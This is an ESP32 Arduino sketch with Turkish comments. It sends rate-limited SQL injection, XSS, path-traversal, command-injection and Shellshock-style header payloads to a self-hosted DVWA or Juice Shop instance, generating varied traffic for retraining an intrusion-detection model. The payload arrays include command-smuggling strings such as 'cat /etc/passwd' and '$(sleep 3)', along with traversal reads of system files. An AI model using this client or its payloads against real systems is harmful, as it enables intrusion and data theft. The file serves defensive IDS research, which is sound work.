// ============================================================================
//  esp32_webattack.ino  --  CICIDS SINIFI: WebAttack (SQLi / XSS / LFI / CMDi)
// ============================================================================
//  YETKI: SADECE sana ait, ayni yerel LAN'daki Windows IDS makinesine karsi,
//  kontrollu/yetkilendirilmis dogrulama/VERI TOPLAMA testi icindir. Baska bir
//  hedefe YONELTME. Hedef, senin kendi makinende calisan zafiyetli test web
//  uygulamasidir (DVWA / OWASP Juice Shop -- bkz. 05_windows_webtarget_setup.ps1).
//
//  NEDEN BU SKETCH VAR (kok gerekce -- veri cesitliligi):
//    Multiclass modelin WebAttack sinifi CICIDS-2017'nin TEK arac/TEK oturum
//    (Selenium+DVWA) izini EZBERLEMIS (bkz. agent-memory: all-class-single-
//    session-diversity-audit -- test satirlarinin %86'si bir egitim satirina
//    <0.1 mesafede). Retrain icin FARKLI kaynaklardan (elle-yazilmis gomulu
//    istemci + sqlmap + nikto) GERCEK, cesitli WebAttack trafigi lazim. Bu
//    sketch "elle-yazilmis gomulu istemci" kaynagidir: ESP32'nin kendine ozgu
//    TCP yigini / User-Agent / zamanlama profili, sqlmap/nikto'dan FARKLI bir
//    ag imzasi uretir -> modelin hic gormedigi cesitlilik.
//
//  ONEMLI: Amac ISTISMAR DEGIL, TRAFIK URETMEK. IDS ozellikleri ag/akis
//  seviyesindedir (paket uzunluklari, act_data_pkt_fwd, SYN Flag Count,
//  Fwd Packet Length Mean -- bkz. r24-port-bucket notu). Yani istekler DVWA
//  oturumu acmasa / 302 login'e donse bile WebAttack trafik DESENI uretilir.
//  Bu yuzden GET+POST+header-injection karisimi ve DEGISKEN yuk uzunluklari
//  kasitlidir (davranissal ozellik cesitliligi icin).
//
//  PORT-BUCKET CESITLILIGI (kritik): process_pcap_multiclass.py `_port_bucket`
//    80/8080 -> "http" bucket, >=1024 -> "ephemeral" bucket. Modelin port'a
//    asiri-bagimliligini kirmak icin bu sketch'i IKI kez calistir:
//      * TARGET_PORT = 80    (DVWA, "http" bucket -- CICIDS'in kendi WebAttack
//                             hedef portuyla ayni, 01'in 8080 static server'iyla CAKISMAZ)
//      * TARGET_PORT = 3000  (Juice Shop, "ephemeral" bucket)  <-- veya 5000
//
//  ARDUINO IDE: Board = "ESP32 Dev Module". Ek kutuphane GEREKMEZ (WiFi.h
//  cekirdekle gelir). Yukle -> Serial Monitor 115200. Senaryo setup()'ta BIR
//  KEZ calisir, biter ve durur; tekrar icin RESET'e bas veya tekrar Upload et.
// ============================================================================

#include <WiFi.h>
#include "secrets.h"   // local, not in git: copy secrets.example.h

// ----- DUZENLENEBILIR DEGISKENLER (yalnizca burayi degistir) ----------------
const char* WIFI_SSID = SECRET_WIFI_SSID;   // set in secrets.h
const char* WIFI_PASS = SECRET_WIFI_PASS;   // set in secrets.h
IPAddress   TARGET_IP(SECRET_TARGET_IP);    // set in secrets.h (IDS machine LAN IP)

// HEDEF PORT: 80=DVWA("http" bucket) | 3000=Juice Shop("ephemeral" bucket).
// Cesitlilik icin sketch'i IKI portla da bir kez calistir (bkz. yukaridaki not).
const uint16_t TARGET_PORT = 3000;            // <-- 80 VEYA 3000 (veya 5000)

const int      ROUNDS      = 20;            // yuk listelerini kac tur don (hacim/cesitlilik)
const uint32_t REQ_DELAY_MS = 250;          // istekler arasi bekleme (ms) -- HIZ SINIRI (asla sel degil)

// DVWA icin opsiyonel oturum cerezi (BOS birakilabilir). Tarayicidan alip
// yapistirirsan DVWA istekleri login'e 302 yerine gercek zafiyet sayfasina
// gider (daha gerceksci trafik). Juice Shop icin GEREKMEZ. Ornek deger:
//   "security=low; PHPSESSID=abcdef0123456789"
const char* DVWA_COOKIE = "ocqpnm169kbtipege108uoh885";               // <-- istege bagli
// ----------------------------------------------------------------------------

// ----- Saldiri yukleri (TEST/lab payload'lari) ------------------------------
// SQLi: union / boolean / error / time-based karisimi.
const char* SQLI[] = {
  "1' OR '1'='1",
  "1' UNION SELECT username,password FROM users-- -",
  "1' AND 1=1-- -",
  "1' AND 1=2-- -",
  "1'; WAITFOR DELAY '0:0:3'-- -",
  "1' OR SLEEP(3)-- -",
  "1'))/**/OR/**/1=1#",
  "admin'-- -"
};
const int N_SQLI = sizeof(SQLI) / sizeof(SQLI[0]);

// XSS: reflected + stored + attribute-break varyantlari.
const char* XSS[] = {
  "<script>alert(1)</script>",
  "\"><script>alert(document.cookie)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "javascript:alert(1)",
  "'><body onload=alert(1)>"
};
const int N_XSS = sizeof(XSS) / sizeof(XSS[0]);

// LFI / path-traversal.
const char* LFI[] = {
  "../../../../etc/passwd",
  "....//....//....//etc/passwd",
  "..%2f..%2f..%2fwindows%2fwin.ini",
  "/etc/passwd%00",
  "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
};
const int N_LFI = sizeof(LFI) / sizeof(LFI[0]);

// Komut enjeksiyonu.
const char* CMDI[] = {
  "127.0.0.1; cat /etc/passwd",
  "127.0.0.1 && whoami",
  "| id",
  "`id`",
  "$(sleep 3)",
  "127.0.0.1 | dir"
};
const int N_CMDI = sizeof(CMDI) / sizeof(CMDI[0]);
// ----------------------------------------------------------------------------

int g_sent = 0;   // gonderilen toplam istek

void connectWiFi() {
  Serial.printf("[WiFi] '%s' agina baglaniliyor", WIFI_SSID);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) { delay(400); Serial.print("."); }
  Serial.printf("\n[WiFi] Baglandi. ESP32 IP = %s\n", WiFi.localIP().toString().c_str());
  Serial.println("[i] Bu IP'yi 04_mongo_analysis.py --attacker-ip degerine yaz.");
}

// Cok basit URL-encode (yalnizca akis ozelligi cesitliligi icin; mukemmel
// olmasi gerekmiyor -- bosluk ve birkac ozel karakter yeter).
String urlEnc(const char* s) {
  String out = "";
  for (const char* p = s; *p; p++) {
    char c = *p;
    if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
      out += c;
    } else if (c == ' ') {
      out += "%20";
    } else {
      char buf[4];
      snprintf(buf, sizeof(buf), "%%%02X", (unsigned char)c);
      out += buf;
    }
  }
  return out;
}

// Tek bir HTTP istegi gonderir: baglan, iste, kisa yanit oku, kapat.
//   method    : "GET" veya "POST"
//   path      : "/..." (query dahil, zaten encode edilmis olmali)
//   body      : POST govdesi ("" ise Content-Length=0)
//   hdrName/hdrVal : ek/enjekte edilen tek bir baslik ("" ise atlanir)
void httpReq(const char* method, const String& path, const String& body,
             const char* hdrName, const String& hdrVal, const char* label) {
  WiFiClient client;
  if (!client.connect(TARGET_IP, TARGET_PORT, 1500)) {
    Serial.printf("  [!] baglanilamadi (%s:%u calisiyor mu?)\n",
                  TARGET_IP.toString().c_str(), TARGET_PORT);
    return;
  }

  String req = String(method) + " " + path + " HTTP/1.1\r\n";
  req += "Host: " + TARGET_IP.toString() + ":" + String(TARGET_PORT) + "\r\n";
  req += "User-Agent: esp32-webattack-lab/1.0\r\n";
  req += "Accept: */*\r\n";
  if (strlen(DVWA_COOKIE) > 0) req += "Cookie: " + String(DVWA_COOKIE) + "\r\n";
  if (strlen(hdrName) > 0)     req += String(hdrName) + ": " + hdrVal + "\r\n";
  if (strcmp(method, "POST") == 0) {
    req += "Content-Type: application/x-www-form-urlencoded\r\n";
    req += "Content-Length: " + String(body.length()) + "\r\n";
  }
  req += "Connection: close\r\n\r\n";
  if (body.length() > 0) req += body;

  client.print(req);

  // Yanitin ilk satirini oku (durum kodu) -- sadece log icin.
  String status = "";
  uint32_t t0 = millis();
  while (millis() - t0 < 1500 && status.length() == 0) {
    while (client.available()) {
      char ch = client.read();
      if (ch == '\n') break;
      if (ch != '\r') status += ch;
    }
    delay(5);
  }
  client.stop();

  g_sent++;
  Serial.printf("  [%-10s] %-4s %-38s -> %s\n", label, method,
                path.substring(0, 38).c_str(),
                status.length() ? status.c_str() : "(yanit yok)");
  delay(REQ_DELAY_MS);   // HIZ SINIRI
}

void runRound(int r) {
  Serial.printf("\n--- tur %d/%d ---\n", r + 1, ROUNDS);

  // 1) GET + SQLi (query param) -- DVWA sqli sayfasi + Juice Shop arama + generic
  for (int i = 0; i < N_SQLI; i++) {
    String p = urlEnc(SQLI[i]);
    httpReq("GET", "/vulnerabilities/sqli/?id=" + p + "&Submit=Submit", "", "", "", "GET-SQLi");
    httpReq("GET", "/rest/products/search?q=" + p, "", "", "", "GET-SQLi");
  }

  // 2) GET + XSS (reflected)
  for (int i = 0; i < N_XSS; i++) {
    String p = urlEnc(XSS[i]);
    httpReq("GET", "/vulnerabilities/xss_r/?name=" + p, "", "", "", "GET-XSS");
    httpReq("GET", "/search?q=" + p, "", "", "", "GET-XSS");
  }

  // 3) GET + LFI / path-traversal
  for (int i = 0; i < N_LFI; i++) {
    String p = urlEnc(LFI[i]);
    httpReq("GET", "/vulnerabilities/fi/?page=" + p, "", "", "", "GET-LFI");
    httpReq("GET", "/index.php?file=" + p, "", "", "", "GET-LFI");
  }

  // 4) POST + SQLi (login formu) -- gercek veri tasiyan ileri paketler (act_data_pkt_fwd)
  for (int i = 0; i < N_SQLI; i++) {
    String u = urlEnc(SQLI[i]);
    String body = "username=" + u + "&password=" + urlEnc("x' OR '1'='1") + "&Login=Login";
    httpReq("POST", "/login.php", body, "", "", "POST-SQLi");
  }

  // 5) POST + XSS (stored -- yorum/mesaj alani)
  for (int i = 0; i < N_XSS; i++) {
    String body = "name=esp32&message=" + urlEnc(XSS[i]) + "&btnSign=Sign";
    httpReq("POST", "/guestbook.php", body, "", "", "POST-XSS");
  }

  // 6) POST + komut enjeksiyonu (DVWA exec sayfasi)
  for (int i = 0; i < N_CMDI; i++) {
    String body = "ip=" + urlEnc(CMDI[i]) + "&Submit=Submit";
    httpReq("POST", "/vulnerabilities/exec/", body, "", "", "POST-CMDi");
  }

  // 7) Header-injection: payload'lari BASLIKLARDA tasi (User-Agent / X-Forwarded-For / Referer)
  httpReq("GET", "/", "", "X-Forwarded-For", urlEnc(SQLI[r % N_SQLI]), "HDR-XFF");
  httpReq("GET", "/", "", "Referer",         String("http://x/") + XSS[r % N_XSS], "HDR-REF");
  httpReq("GET", "/", "", "User-Agent-Inj",  String("() { :;}; ") + CMDI[r % N_CMDI], "HDR-UA");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n============================================================");
  Serial.println(" ESP32 CANLI-ATES -- CICIDS WebAttack (SQLi/XSS/LFI/CMDi)");
  Serial.println("============================================================");
  Serial.printf(" HEDEF        : %s:%u  (%s bucket)\n",
                TARGET_IP.toString().c_str(), TARGET_PORT,
                (TARGET_PORT == 80 || TARGET_PORT == 8080) ? "http" : "ephemeral");
  Serial.printf(" TUR          : %d  (istek/tur ~%d)\n", ROUNDS,
                2 * N_SQLI + 2 * N_XSS + 2 * N_LFI + N_SQLI + N_XSS + N_CMDI + 3);
  Serial.printf(" HIZ SINIRI   : istekler arasi %u ms (asla sel degil)\n", (unsigned)REQ_DELAY_MS);
  Serial.println(" AMAC         : cesitli WebAttack TRAFIGI toplamak (retrain icin).");
  Serial.println(" YETKI        : yalnizca sana ait hedef, yetkili lab testi.");
  Serial.println("------------------------------------------------------------");

  connectWiFi();
  Serial.println("\n[>>>] WebAttack istekleri basliyor...");

  for (int r = 0; r < ROUNDS; r++) runRound(r);

  Serial.println("\n============================================================");
  Serial.printf(" WEBATTACK BITTI. Toplam gonderilen istek: %d\n", g_sent);
  Serial.println(" Simdi Windows'ta: 04_mongo_analysis.py --last N --attacker-ip <ESP32_IP>");
  Serial.println(" Beklenti: predicted_class=WebAttack (model-bagimli dal). NOT: WebAttack");
  Serial.println("  ezberli+model-bagimli oldugundan (bkz. diversity-audit) sonuc DEGISKEN");
  Serial.println("  olabilir -- suppressed_by / ood_distance / status'a tek tek bak.");
  Serial.println(" 80 VE 3000 portlariyla ayri ayri calistirmayi UNUTMA (bucket cesitliligi).");
  Serial.println("============================================================");
}

void loop() {
  delay(10000);  // tek seferlik; tekrar icin RESET.
}
